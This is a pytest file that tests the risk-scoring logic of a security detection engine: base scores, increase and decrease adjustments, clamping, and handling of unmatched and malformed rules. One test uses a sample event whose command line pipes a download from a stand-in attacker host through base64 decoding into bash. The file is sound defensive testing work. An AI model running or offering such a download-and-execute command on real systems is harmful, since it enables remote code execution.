import pytest
from app.detection.engine.rule_loader import RuleLoader
from app.detection.engine.rule_evaluator import RuleEvaluator
from app.detection.engine.risk_scoring import RiskScorer
from app.detection.schemas.rule_schema import DetectionRule

@pytest.fixture
def sample_rule():
    loader = RuleLoader()
    all_rules = loader.load_rules_from_directory(loader.rules_path, include_disabled=True)
    rule = next((r for r in all_rules if r.id == "linux_t1059_shell_network_tool_sample"), None)
    return rule

@pytest.fixture
def scorer():
    return RiskScorer()

@pytest.fixture
def evaluator():
    return RuleEvaluator()

def test_matched_rule_no_adjustment_keeps_base_score(scorer, evaluator):
    rule_data = {
        "id": "test_no_adj",
        "name": "No Adjustment",
        "description": "test",
        "severity": "medium",
        "risk_score": 50,
        "mitre": {"tactic": "test"},
        "log_source": {"product": "test"},
        "required_fields": ["f1"],
        "condition": {"field": "f1", "operator": "equals", "value": "v1"},
        "investigation_guide": "test"
    }
    rule = DetectionRule(**rule_data)
    event = {"f1": "v1"}
    match_result = evaluator.evaluate(event, rule)
    
    result = scorer.calculate(event, rule, match_result)
    assert result.final_score == 50
    assert result.final_severity == "medium"
    assert "No risk adjustments applied" in result.adjustment_reasons

def test_increase_if_adds_score(scorer, evaluator, sample_rule):
    # Sample rule has increase_if for base64 in command_line with +20
    event = {
        "process": {
            "name": "bash",
            "command_line": "curl http://evil.com | base64 -d | bash",
            "parent": {"name": "sshd"}
        },
        "user": {"name": "root"},
        "host": {"name": "test"}
    }
    match_result = evaluator.evaluate(event, sample_rule)
    assert match_result.matched is True
    
    # Base score is 47. 47 + 20 = 67.
    result = scorer.calculate(event, sample_rule, match_result)
    assert result.final_score == 67
    assert result.final_severity == "high" # 67 is in 61-80
    assert any("Shell command contains high-risk execution indicators" in r for r in result.adjustment_reasons)

def test_decrease_if_subtracts_score(scorer, evaluator):
    rule_data = {
        "id": "test_decrease",
        "name": "Test Decrease",
        "description": "test",
        "severity": "high",
        "risk_score": 75,
        "mitre": {"tactic": "test"},
        "log_source": {"product": "test"},
        "required_fields": ["f1", "f2"],
        "condition": {"field": "f1", "operator": "equals", "value": "v1"},
        "risk_adjustment": {
            "decrease_if": [
                {"field": "f2", "operator": "equals", "value": "v2", "subtract_score": 30, "reason": "Lowered"}
            ]
        },
        "investigation_guide": "test"
    }
    rule = DetectionRule(**rule_data)
    event = {"f1": "v1", "f2": "v2"}
    match_result = evaluator.evaluate(event, rule)
    
    # 75 - 30 = 45.
    result = scorer.calculate(event, rule, match_result)
    assert result.final_score == 45
    assert result.final_severity == "medium" # 45 is in 41-60
    assert "Lowered" in result.adjustment_reasons

def test_score_clamping(scorer, evaluator):
    rule_data = {
        "id": "test_clamp",
        "name": "Test Clamp",
        "description": "test",
        "severity": "low",
        "risk_score": 10,
        "mitre": {"tactic": "test"},
        "log_source": {"product": "test"},
        "required_fields": ["f1"],
        "condition": {"field": "f1", "operator": "equals", "value": "v1"},
        "risk_adjustment": {
            "increase_if": [{"field": "f1", "operator": "exists", "add_score": 200, "reason": "Too much"}],
            "decrease_if": [{"field": "f1", "operator": "exists", "subtract_score": 500, "reason": "Too little"}]
        },
        "investigation_guide": "test"
    }
    rule = DetectionRule(**rule_data)
    event = {"f1": "v1"}
    match_result = evaluator.evaluate(event, rule)
    
    # If both apply: 10 + 200 - 500 = -290 -> 0
    result = scorer.calculate(event, rule, match_result)
    assert result.final_score == 0
    assert result.final_severity == "informational"

    # Test clamping at 100
    rule_data["risk_score"] = 90
    rule_data["risk_adjustment"]["decrease_if"] = []
    rule = DetectionRule(**rule_data)
    result = scorer.calculate(event, rule, match_result)
    assert result.final_score == 100
    assert result.final_severity == "critical"

def test_unmatched_rule_skips_scoring(scorer, evaluator):
    rule_data = {
        "id": "test_unmatched",
        "name": "Unmatched",
        "description": "test",
        "severity": "high",
        "risk_score": 80,
        "mitre": {"tactic": "test"},
        "log_source": {"product": "test"},
        "required_fields": ["f1"],
        "condition": {"field": "f1", "operator": "equals", "value": "v1"},
        "investigation_guide": "test"
    }
    rule = DetectionRule(**rule_data)
    event = {"f1": "wrong"}
    match_result = evaluator.evaluate(event, rule)
    
    result = scorer.calculate(event, rule, match_result)
    assert result.final_score == 0
    assert result.final_severity == "informational"
    assert "Rule did not match; risk scoring skipped" in result.adjustment_reasons

def test_malformed_adjustment_records_error(scorer, evaluator):
    rule_data = {
        "id": "test_malformed",
        "name": "Malformed",
        "description": "test",
        "severity": "medium",
        "risk_score": 50,
        "mitre": {"tactic": "test"},
        "log_source": {"product": "test"},
        "required_fields": ["f1"],
        "condition": {"field": "f1", "operator": "equals", "value": "v1"},
        "risk_adjustment": {
            "increase_if": "not a list" # Malformed
        },
        "investigation_guide": "test"
    }
    rule = DetectionRule(**rule_data)
    event = {"f1": "v1"}
    match_result = evaluator.evaluate(event, rule)
    
    result = scorer.calculate(event, rule, match_result)
    assert result.final_score == 50
    assert any("must be a list" in e for e in result.errors)
